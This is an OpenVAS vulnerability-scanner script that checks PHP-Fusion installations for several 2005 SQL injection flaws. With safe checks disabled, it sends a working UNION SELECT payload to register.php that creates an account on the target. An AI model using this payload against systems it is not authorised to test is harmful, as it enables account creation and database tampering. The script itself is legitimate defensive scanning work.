###############################################################################
# OpenVAS Vulnerability Test
# $Id: php_fusion_6_00_110.nasl 5668 2017-03-21 14:16:34Z cfi $
#
# PHP-Fusion < 6.00.110 Multiple SQL Injection Vulnerabilities
#
# Authors:
# Josh Zlatin-Amishav (josh at ramat dot cc)
#
# Copyright:
# Copyright (C) 2005 Josh Zlatin-Amishav
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:php-fusion:php-fusion";

# Updated: 04/07/2009
# Antu Sanadi <santu@secpod.com>

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.20009");
  script_version("$Revision: 5668 $");
  script_tag(name:"last_modification", value:"$Date: 2017-03-21 15:16:34 +0100 (Tue, 21 Mar 2017) $");
  script_tag(name:"creation_date", value:"2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2005-3157", "CVE-2005-3158", "CVE-2005-3160", "CVE-2005-3161");
  script_bugtraq_id(14964, 14992, 15005, 15018);
  script_name("PHP-Fusion < 6.00.110 Multiple SQL Injection Vulnerabilities");
  script_category(ACT_MIXED_ATTACK);
  script_family("Web application abuses");
  script_copyright("(C) 2005 Josh Zlatin-Amishav");
  script_dependencies("secpod_php_fusion_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("php-fusion/installed");

  tag_solution = "Update to at least version 6.00.110 of PHP-Fusion.";

  tag_summary = "The remote version of this software is vulnerable to multiple SQL
  injection attacks due to its failure to properly sanitize certain parameters.
  Provided PHP's 'magic_quotes_gpc' setting is disabled, these flaws allow an
  attacker to manipulate database queries, which may result in the disclosure or
  modification of data.";

  script_tag(name:"solution", value:tag_solution);
  script_tag(name:"summary", value:tag_summary);

  script_xref(name : "URL" , value : "http://securityfocus.org/archive/1/411909");
  script_xref(name : "URL" , value : "http://archives.neohapsis.com/archives/secunia/2005-q4/0021.html");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_banner");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("version_func.inc");
include("misc_func.inc");
include("url_func.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! infos = get_app_version_and_location( cpe:CPE, port:port, exit_no_version:FALSE ) ) exit( 0 );

ver = infos['version'];
dir = infos['location'];

if( ! safe_checks() ) {

  if( dir == "/" ) dir = "";

  user = rand_str(charset:"abcdefghijklmnopqrstuvwxyz0123456789_");
  pass = rand_str();
  email = string(user, "@", get_host_name());
  sploit = string("UNION SELECT ",'"",', '"",', '0,',"'a:4:{",
          's:9:"user_name";s:', strlen(user), ':"', user, '";',
          's:13:"user_password";s:', strlen(pass), ':"', pass, '";',
          's:10:"user_email";s:', strlen(email), ':"', email, '";',
          's:15:"user_hide_email";s:1:"1";',
           "}");

  postdata = string("activate=", rand_str(), "'+", urlencode(str:sploit));
  url = dir + "/register.php?plugin=" + SCRIPT_NAME;
  req = string( "POST ", url, " HTTP/1.1\r\n",
                "Host: ", get_host_name(), "\r\n",
                "Content-Type: application/x-www-form-urlencoded\r\n",
                "Content-Length: ", strlen(postdata), "\r\n",
                "\r\n",
                postdata );
  res = http_keepalive_send_recv( port:port, data:req, bodyonly:TRUE );
  if( isnull( res ) ) exit( 0 );

  if( "Your account has been verified." >< res ) {
    report = report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

if( version_is_less_equal( version:ver, test_version:"6.00.100" ) ) {
  report = report_fixed_ver( installed_version:ver, fixed_version:"6.00.110" );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );